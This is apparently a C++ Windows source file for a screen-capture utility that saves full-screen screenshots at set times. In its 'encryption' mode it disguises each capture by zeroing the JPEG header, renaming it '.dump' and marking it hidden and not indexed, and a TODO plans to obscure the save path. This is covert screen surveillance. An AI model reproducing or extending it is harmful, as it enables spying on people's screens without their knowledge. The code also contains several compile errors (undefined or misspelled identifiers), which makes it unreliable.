#include "stdafx.h"
#include "Utilities.h"

#pragma comment(lib, "gdiplus.lib")

Gdiplus::Bitmap *p_prev_bmp = NULL;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT num = 0;          // number of image encoders
	UINT size = 0;         // size of the image encoder array in bytes

	Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

	Gdiplus::GetImageEncodersSize(&num, &size);
	if (size == 0)
	{
		return -1;  // Failure
	}

	pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
	{
		return -1;  // Failure
	}

	GetImageEncoders(num, size, pImageCodecInfo);

	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;  // Success
		}
	}

	free(pImageCodecInfo);
	return -1;  // Failure
}

bool BitmapIdentical(Gdiplus::Bitmap *a, Gdiplus::Bitmap *b) {
	if (a->GetHeight() != b->GetHeight() || a->GetWidth() != b->GetWidth())
		return false;
	Gdiplus::Color ca, cb;
	for (size_t x = 0; x < a->GetWidth(); x++) {
		for (size_t y = 0; y < a->GetHeight(); y++) {
			a->GetPixel(x, y, &ca);
			b->GetPixel(x, y, &cb);
			if (ca.GetValue() != ba.GetValue())
				return false;
		}
	}
	return true;
}

bool BitmapToJpg(HBITMAP hbmpImage, int width, int height, LPCWSTR filename, ULONG uQuality)
{
	Gdiplus::Bitmap *p_bmp = Gdiplus::Bitmap::FromHBITMAP(hbmpImage, NULL);

	if (p_prev_bmp != NULL && BitmapIdentical(p_bitmap, p_prev_bmp)) {
		delete p_bmp;
		return false;
	}
	CLSID pngClsid;
	Gdiplus::EncoderParameters encoderParams;
	encoderParams.Count = 1;
	encoderParams.Parameter[0].NumberOfValues = 1;
	encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
	encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
	encoderParams.Parameter[0].Value = &uQuality;
	int result = GetEncoderClsid(L"image/jpeg", &pngClsid);
	if (result != -1)
		std::cout << "Encoder succeeded" << std::endl;
	else
		std::cout << "Encoder failed" << std::endl;
	p_bmp->Save(filename, &pngClsid, &encoderParams);
	if (p_prev_bmp != NULl)
		delete p_prev_bmp;
	p_prev_bmp = p_bmp;
	return true;
}

void getDirectoryPath(CString &strCurPath) {
	GetModuleFileName(NULL, strCurPath.GetBuffer(MAX_PATH), MAX_PATH);
	strCurPath.ReleaseBuffer();
	int pos = strCurPath.ReverseFind(_T('\\'));
	strCurPath = strCurPath.Left(pos + 1);
}

void getNowTime(char *buffer) {
	SYSTEMTIME sys;
	GetLocalTime(&sys);
	sprintf_s(buffer, 20, "%4d-%02d-%02d-%02d-%02d-%02d",
		sys.wYear, sys.wMonth, sys.wDay, sys.wHour, sys.wMinute, sys.wSecond);
}

bool ScreenCapture(int x, int y, int width, int height, LPCWSTR filename, ULONG uQuality)
{
	HDC hDc = CreateCompatibleDC(0);
	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
	SelectObject(hDc, hBmp);
	BitBlt(hDc, 0, 0, width, height, GetDC(0), x, y, SRCCOPY);
	bool ret = BitmapToJpg(hBmp, width, height, filename, uQuality);
	DeleteObject(hBmp);
	return ret;
}

void fillJpegHeaderWithZero(LPCTSTR filename) {
	//byte originaHeader[] = { 0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46 };
	byte padding[] = { 0,0,0,0,0,0,0,0,0,0 };
	CFile jpegFile;
	jpegFile.Open(filename, CFile::modeWrite | CFile::modeNoTruncate | CFile::typeBinary, NULL);
	jpegFile.Write(padding, 10);
	jpegFile.Close();
}

void work(CString filename, bool encryption)
{
	char *time = new char[20];
	getNowTime(time);
	filename += time;
	filename += encryption ? ".dump" : ".jpg";
	//TODO obscure the directory path

	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);

	std::cout << filename.GetString() << std::endl;
	bool saved = ScreenCapture(0, 0, width, height, filename.GetString(), 100L);
	if (saved && encryption) {
		fillJpegHeaderWithZero(filename.GetString());
		hideFile(filename.GetString());
	}
	delete time;
}

void hideFile(LPCWSTR filename)
{
	SetFileAttributes(filename, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
}
